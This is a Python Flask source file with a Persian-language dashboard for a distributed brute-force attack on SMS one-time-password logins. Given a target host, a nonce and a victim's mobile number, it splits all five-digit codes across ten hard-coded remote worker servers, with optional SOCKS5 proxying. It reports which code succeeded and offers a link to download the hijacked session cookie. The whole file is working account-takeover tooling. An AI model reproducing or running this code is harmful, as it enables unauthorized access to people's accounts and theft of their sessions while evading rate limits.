import requests
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO, emit
import threading

app = Flask(__name__)
socketio = SocketIO(app)

REMOTE_SERVERS = [
    "http://63.142.254.127:5000",
    "http://63.142.246.30:5000",
    "http://185.189.27.75:5000",
    "http://185.183.182.191:5000",
    "http://185.185.126.164:5000",
    "http://104.251.211.205:5000",
    "http://185.189.27.11:5000",
    "http://185.183.182.217:5000",
    "http://185.183.182.137:5000",
    "http://104.251.219.67:5000",
]

RANGES = [
    (0, 10000),
    (10000, 20000),
    (20000, 30000),
    (30000, 40000),
    (40000, 50000),
    (50000, 60000),
    (60000, 70000),
    (70000, 80000),
    (80000, 90000),
    (90000, 99999),
]

progress_log = []
found_success = False
success_codes = []

def send_to_remote(server_url, host, nonce, mobile, connections, start_range, end_range, proxy_ip="", proxy_port=""):
    """ارسال درخواست به سرور ریموت"""
    try:
        # ساخت آدرس پروکسی اگه IP و پورت داده شده باشه
        proxy = f"socks5://{proxy_ip}:{proxy_port}" if proxy_ip and proxy_port else ""
        response = requests.post(
            f"{server_url}/start",
            json={
                "host": host,
                "nonce": nonce,
                "mobile": mobile,
                "connections": connections,
                "startRange": start_range,
                "endRange": end_range,
                "proxy": proxy  # ارسال پروکسی به ورکر (اگه خالی باشه، "" می‌فرسته)
            },
            timeout=10
        )
        response.raise_for_status()
        progress_log.append(f"Request sent to {server_url} for range {start_range}-{end_range}")
        socketio.emit('update_progress', {'log': progress_log[-1]})
    except requests.exceptions.RequestException as e:
        progress_log.append(f"Failed to send request to {server_url}: {str(e)}")
        socketio.emit('update_progress', {'log': progress_log[-1]})

def stop_all_servers():
    """توقف همه سرورها"""
    for server in REMOTE_SERVERS:
        try:
            requests.post(f"{server}/stop", timeout=5)
            progress_log.append(f"Stop request sent to {server}")
            socketio.emit('update_progress', {'log': progress_log[-1]})
        except requests.exceptions.RequestException as e:
            progress_log.append(f"Failed to stop {server}: {str(e)}")
            socketio.emit('update_progress', {'log': progress_log[-1]})

def get_worker_status():
    """جمع‌آوری وضعیت ورکرها"""
    global success_codes
    status_data = {}
    for server in REMOTE_SERVERS:
        try:
            response = requests.get(f"{server}/status", timeout=5)
            response.raise_for_status()
            status = response.json()
            status_data[server] = {
                "running": status["running"],
                "current_range": status["current_range"],
                "processed": status["processed"],
                "error": status["error"]
            }
            if status["error"] and "Code" in status["error"] and "found successfully" in status["error"]:
                global found_success
                found_success = True
                code = status["error"].split("Code ")[1].split(" found")[0]
                if not any(s["code"] == code for s in success_codes):
                    success_codes.append({"server": server, "code": code, "cookie_link": f"{server}/last_cookie"})
                progress_log.append(f"Success found on {server}! Stopping all servers...")
                socketio.emit('update_progress', {'log': progress_log[-1]})
                stop_all_servers()
        except requests.exceptions.RequestException as e:
            status_data[server] = {
                "running": False,
                "current_range": {"start": "-", "end": "-"},
                "processed": "-",
                "error": f"Failed to connect: {str(e)}"
            }
    return status_data

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="fa">
    <head>
        <meta charset="UTF-8">
        <title>بررسی کد OTP - سرور مرکزی</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.1/socket.io.js"></script>
        <style>
            body { direction: rtl; font-family: Arial, sans-serif; }
            .container { max-width: 1200px; margin: 0 auto; }
            #progress-table, #success-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            #progress-table th, #progress-table td, #success-table th, #success-table td { border: 1px solid #ddd; padding: 12px; text-align: center; }
            #progress-table th, #success-table th { background-color: #f2f2f2; font-weight: bold; }
            #progress-table tr:nth-child(even), #success-table tr:nth-child(even) { background-color: #f9f9f9; }
            #progress-table tr:hover, #success-table tr:hover { background-color: #f1f1f1; }
            .status-active { color: green; font-weight: bold; }
            .status-inactive { color: red; font-weight: bold; }
            .error-cell { color: #d9534f; max-width: 300px; word-wrap: break-word; }
            .success-link { color: #1e90ff; text-decoration: underline; }
        </style>
    </head>
    <body class="bg-gray-100 p-8">
        <div class="container">
            <div class="bg-white p-8 rounded-lg shadow-lg">
                <h1 class="text-3xl font-bold text-center mb-8">بررسی کد OTP - سرور مرکزی</h1>
                <form id="form" class="space-y-6">
                    <div>
                        <label class="block text-sm font-medium text-gray-700">هاست:</label>
                        <input type="text" id="host" class="mt-1 block w-full p-3 border rounded-lg" value="www.h.com">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Nonce:</label>
                        <input type="text" id="nonce" class="mt-1 block w-full p-3 border rounded-lg" value="9d6178e07d">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">شماره موبایل:</label>
                        <input type="text" id="mobile" class="mt-1 block w-full p-3 border rounded-lg" value="0911">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">تعداد کانکشن‌ها:</label>
                        <input type="number" id="connections" class="mt-1 block w-full p-3 border rounded-lg" value="20">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">آی‌پی پروکسی (SOCKS5):</label>
                        <input type="text" id="proxy_ip" class="mt-1 block w-full p-3 border rounded-lg" placeholder="مثال: 192.168.1.1">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">پورت پروکسی:</label>
                        <input type="text" id="proxy_port" class="mt-1 block w-full p-3 border rounded-lg" placeholder="مثال: 1080">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">نوع اسکن:</label>
                        <div class="mt-2">
                            <label class="inline-flex items-center">
                                <input type="radio" name="scan_type" value="full" class="form-radio" checked>
                                <span class="mr-2">اسکن کامل (00000-99999)</span>
                            </label>
                            <label class="inline-flex items-center mr-6">
                                <input type="radio" name="scan_type" value="custom" class="form-radio">
                                <span class="mr-2">اسکن سفارشی</span>
                            </label>
                        </div>
                    </div>
                    <div id="custom_range" class="hidden space-y-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-700">شروع رنج:</label>
                            <input type="number" id="start_range" class="mt-1 block w-full p-3 border rounded-lg" placeholder="مثال: 20000">
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-gray-700">پایان رنج:</label>
                            <input type="number" id="end_range" class="mt-1 block w-full p-3 border rounded-lg" placeholder="مثال: 30000">
                        </div>
                    </div>
                    <div class="flex space-x-6">
                        <button type="button" id="start" class="w-full bg-green-500 text-white p-3 rounded-lg hover:bg-green-600">شروع</button>
                        <button type="button" id="stop" class="w-full bg-red-500 text-white p-3 rounded-lg hover:bg-red-600" disabled>توقف</button>
                    </div>
                </form>
                <div class="mt-8">
                    <h2 class="text-xl font-semibold text-center mb-4">وضعیت سرورها</h2>
                    <table id="progress-table">
                        <thead>
                            <tr>
                                <th>سرور</th>
                                <th>وضعیت</th>
                                <th>رنج فعلی</th>
                                <th>تعداد پردازش‌شده</th>
                                <th>خطا</th>
                            </tr>
                        </thead>
                        <tbody id="table-body">
                        </tbody>
                    </table>
                </div>
                <div class="mt-8">
                    <h2 class="text-xl font-semibold text-center mb-4">موفقیت‌ها</h2>
                    <table id="success-table">
                        <thead>
                            <tr>
                                <th>سرور</th>
                                <th>کد موفق</th>
                                <th>لینک کوکی</th>
                            </tr>
                        </thead>
                        <tbody id="success-body">
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <script>
            const socket = io();
            const form = document.getElementById('form');
            const startBtn = document.getElementById('start');
            const stopBtn = document.getElementById('stop');
            const tableBody = document.getElementById('table-body');
            const successBody = document.getElementById('success-body');

            const servers = [
                "http://63.142.254.127:5000",
                "http://63.142.246.30:5000",
                "http://185.189.27.75:5000",
                "http://185.189.27.62:5000",
                "http://185.185.126.164:5000",
                "http://104.251.211.205:5000",
                "http://185.189.27.11:5000",
                "http://185.183.182.217:5000",
                "http://185.183.182.137:5000",
                "http://104.251.219.67:5000"
            ];

            function updateTables() {
                fetch('/get_status')
                    .then(response => response.json())
                    .then(data => {
                        tableBody.innerHTML = '';
                        servers.forEach(server => {
                            const status = data[server] || {
                                running: false,
                                current_range: { start: '-', end: '-' },
                                processed: '-',
                                error: 'No data available'
                            };
                            const row = document.createElement('tr');
                            row.innerHTML = `
                                <td>${server}</td>
                                <td class="${status.running ? 'status-active' : 'status-inactive'}">
                                    ${status.running ? 'فعال' : 'غیرفعال'}
                                </td>
                                <td>${status.current_range.start} - ${status.current_range.end}</td>
                                <td>${status.processed} / ${status.current_range.end}</td>
                                <td class="error-cell">${status.error || '-'}</td>
                            `;
                            tableBody.appendChild(row);
                        });

                        fetch('/get_success')
                            .then(response => response.json())
                            .then(successData => {
                                successBody.innerHTML = '';
                                successData.forEach(success => {
                                    const row = document.createElement('tr');
                                    row.innerHTML = `
                                        <td>${success.server}</td>
                                        <td>${success.code}</td>
                                        <td><a href="${success.cookie_link}" class="success-link" target="_blank">دانلود کوکی</a></td>
                                    `;
                                    successBody.appendChild(row);
                                });
                            });
                    });
            }

            setInterval(updateTables, 5000);
            updateTables();

            socket.on('connect', () => console.log('Connected to WebSocket'));
            socket.on('update_progress', function(data) { console.log('Log:', data.log); });

            document.querySelectorAll('input[name="scan_type"]').forEach(radio => {
                radio.addEventListener('change', () => {
                    const customRangeDiv = document.getElementById('custom_range');
                    customRangeDiv.classList.toggle('hidden', radio.value !== 'custom');
                });
            });

            startBtn.addEventListener('click', () => {
                const host = document.getElementById('host').value;
                const nonce = document.getElementById('nonce').value;
                const mobile = document.getElementById('mobile').value;
                const connections = document.getElementById('connections').value;
                const proxy_ip = document.getElementById('proxy_ip').value;
                const proxy_port = document.getElementById('proxy_port').value;
                const scanType = document.querySelector('input[name="scan_type"]:checked').value;
                let startRange = null;
                let endRange = null;

                if (scanType === 'custom') {
                    startRange = document.getElementById('start_range').value;
                    endRange = document.getElementById('end_range').value;
                    if (!startRange || !endRange || startRange >= endRange) {
                        alert('لطفاً رنج معتبر وارد کنید!');
                        return;
                    }
                }

                fetch('/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ host, nonce, mobile, connections, proxy_ip, proxy_port, scan_type: scanType, start_range: startRange, end_range: endRange })
                }).then(response => {
                    if (response.ok) {
                        startBtn.disabled = true;
                        stopBtn.disabled = false;
                    }
                });
            });

            stopBtn.addEventListener('click', () => {
                fetch('/stop', {
                    method: 'POST'
                }).then(() => {
                    startBtn.disabled = false;
                    stopBtn.disabled = true;
                });
            });
        </script>
    </body>
    </html>
    ''')

@app.route('/start', methods=['POST'])
def start():
    global progress_log, found_success, success_codes
    data = request.get_json()
    host = data['host']
    nonce = data['nonce']
    mobile = data['mobile']
    connections = int(data['connections'])
    proxy_ip = data.get('proxy_ip', '')
    proxy_port = data.get('proxy_port', '')
    scan_type = data.get('scan_type', 'full')
    start_range = data.get('start_range')
    end_range = data.get('end_range')

    found_success = False
    progress_log = []
    success_codes = []
    progress_log.append("Starting distribution to remote servers...")
    socketio.emit('update_progress', {'log': progress_log[-1]})

    if scan_type == 'full':
        ranges = RANGES
    else:
        start_range = int(start_range)
        end_range = int(end_range)
        total_range = end_range - start_range
        chunk_size = total_range // len(REMOTE_SERVERS)
        ranges = []
        for i in range(len(REMOTE_SERVERS)):
            chunk_start = start_range + (i * chunk_size)
            chunk_end = chunk_start + chunk_size if i < len(REMOTE_SERVERS) - 1 else end_range
            ranges.append((chunk_start, chunk_end))

    threads = []
    for i, server in enumerate(REMOTE_SERVERS):
        start_r, end_r = ranges[i]
        thread = threading.Thread(target=send_to_remote, args=(server, host, nonce, mobile, connections, start_r, end_r, proxy_ip, proxy_port))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    return '', 204

@app.route('/stop', methods=['POST'])
def stop():
    global progress_log
    stop_all_servers()
    return '', 204

@app.route('/get_status', methods=['GET'])
def get_status():
    return jsonify(get_worker_status())

@app.route('/get_success', methods=['GET'])
def get_success():
    global success_codes
    return jsonify(success_codes)

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
